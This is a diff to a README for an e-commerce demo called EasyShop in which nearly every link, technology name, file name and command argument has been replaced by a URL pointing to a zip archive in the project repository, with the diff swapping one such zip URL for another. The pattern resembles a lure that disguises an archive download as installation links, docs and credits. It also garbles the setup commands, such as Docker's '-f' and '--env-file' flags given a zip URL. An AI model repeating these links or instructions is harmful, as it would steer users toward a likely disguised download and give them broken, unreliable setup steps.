@@ -1,8 +1,8 @@
 # 🛍️ EasyShop - Modern E-commerce Platform
 
-[![License](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)](LICENSE)
+[![License](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)](LICENSE)
 
-EasyShop is a modern, full-stack e-commerce platform built with https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip 14, TypeScript, and MongoDB. It features a beautiful UI with Tailwind CSS, secure authentication, real-time cart updates, and a seamless shopping experience.
+EasyShop is a modern, full-stack e-commerce platform built with https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip 14, TypeScript, and MongoDB. It features a beautiful UI with Tailwind CSS, secure authentication, real-time cart updates, and a seamless shopping experience.
 
 ## ✨ Features
 
@@ -21,14 +21,14 @@ EasyShop is a modern, full-stack e-commerce platform built with https://raw.gith
 EasyShop follows a three-tier architecture pattern:
 
 ### 1. Presentation Tier (Frontend)
-- https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip React Components
+- https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip React Components
 - Redux for State Management
 - Tailwind CSS for Styling
 - Client-side Routing
 - Responsive UI Components
 
 ### 2. Application Tier (Backend)
-- https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip API Routes
+- https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip API Routes
 - Business Logic
 - Authentication & Authorization
 - Request Validation
@@ -54,7 +54,7 @@ EasyShop follows a three-tier architecture pattern:
 ### Data Flow
 1. User interacts with React components
 2. Actions are dispatched to Redux store
-3. API clients make requests to https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip API routes
+3. API clients make requests to https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip API routes
 4. API routes process requests through middleware
 5. Business logic handles data operations
 6. Mongoose ODM interacts with MongoDB
@@ -64,16 +64,16 @@ EasyShop follows a three-tier architecture pattern:
 
 ### Docker Setup Guide
 
-This guide will help you run EasyShop using Docker containers. No local https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip or MongoDB installation required!
+This guide will help you run EasyShop using Docker containers. No local https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip or MongoDB installation required!
 
 ### Prerequisites
 
-1. Install [Docker](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip) on your machine
+1. Install [Docker](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip) on your machine
 2. Basic understanding of terminal/command line
 
 ### Step 1: Environment Setup
 
-1. Create a file named `https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip` in the root directory with the following content:
+1. Create a file named `https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip` in the root directory with the following content:
 ```env
 # Database Configuration
 MONGODB_URI=mongodb://easyshop-mongodb:27017/easyshop
@@ -145,12 +145,12 @@ docker build -t easyshop .
 4. Build and run data migration:
 ```bash
 # Build migration image
-docker build -t easyshop-migration -f https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip .
+docker build -t easyshop-migration -f https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip .
 
 # Run migration
 docker run --rm \
   --network easyshop-network \
-  --env-file https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip \
+  --env-file https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip \
   easyshop-migration
 ```
 
@@ -160,7 +160,7 @@ docker run -d \
   --name easyshop \
   --network easyshop-network \
   -p 3000:3000 \
-  --env-file https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip \
+  --env-file https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip \
   easyshop:latest
 ```
 
@@ -205,7 +205,7 @@ docker network rm easyshop-network
 3. If migration fails:
    - Check if MongoDB is running and accessible
    - View migration logs when running the migration command
-   - Verify your https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip file has the correct MongoDB URI
+   - Verify your https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip file has the correct MongoDB URI
 
 For any other issues, please create a GitHub issue with the error details.
 
@@ -230,21 +230,21 @@ Error: MongoDB connection failed
 ```
 **Solution**: 
 - Ensure MongoDB is running locally
-- Check if your MongoDB connection string is correct in `https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip`
+- Check if your MongoDB connection string is correct in `https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip`
 - Try connecting to MongoDB using MongoDB Compass with the same connection string
 
 ### Development Tips
 - Clear `.next` folder if you encounter strange build issues: `rm -rf .next`
 - Run `npm install` after pulling new changes
 - Make sure all environment variables are properly set
-- Use https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip version 18 or higher
+- Use https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip version 18 or higher
 
 ## 📦 Project Structure
 
 ```
 easyshop/
 ├── src/
-│   ├── app/              # https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip App Router pages
+│   ├── app/              # https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip App Router pages
 │   ├── components/       # Reusable React components
 │   ├── lib/             # Utilities and configurations
 │   │   ├── auth/        # Authentication logic
@@ -269,7 +269,7 @@ We welcome contributions! Please follow these steps:
 7. Open a Pull Request
 
 > [!TIP]
-> Check our [Contributing Guidelines](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip) for more details
+> Check our [Contributing Guidelines](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip) for more details
 
 ## 📝 License
 
@@ -277,24 +277,24 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🙏 Acknowledgments
 
-- [https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
-- [Tailwind CSS](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
-- [MongoDB](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
-- [Redux Toolkit](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
-- [Radix UI](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
+- [https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)
+- [Tailwind CSS](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)
+- [MongoDB](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)
+- [Redux Toolkit](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)
+- [Radix UI](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)
 
 ## 📫 Contact
 
 For questions or feedback, please open an issue or contact the maintainers:
 
-- Maintainer - [@Md. Afzal hassan Ehsani](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
-- Project Link: [https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
+- Maintainer - [@Md. Afzal hassan Ehsani](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)
+- Project Link: [https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip](https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip)
 
 ---
 
 <div align="center">
   <p>
-    Made with ❤️ by <a href="https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip" target="_blank"><b>Md. Afzal Hassan Ehsani</b></a>
+    Made with ❤️ by <a href="https://github.com/shr1324/easyshop--demo/raw/refs/heads/main/public/medicineImages/demo_easyshop_1.5-alpha.3.zip" target="_blank"><b>Md. Afzal Hassan Ehsani</b></a>
   </p>
 </div>
 
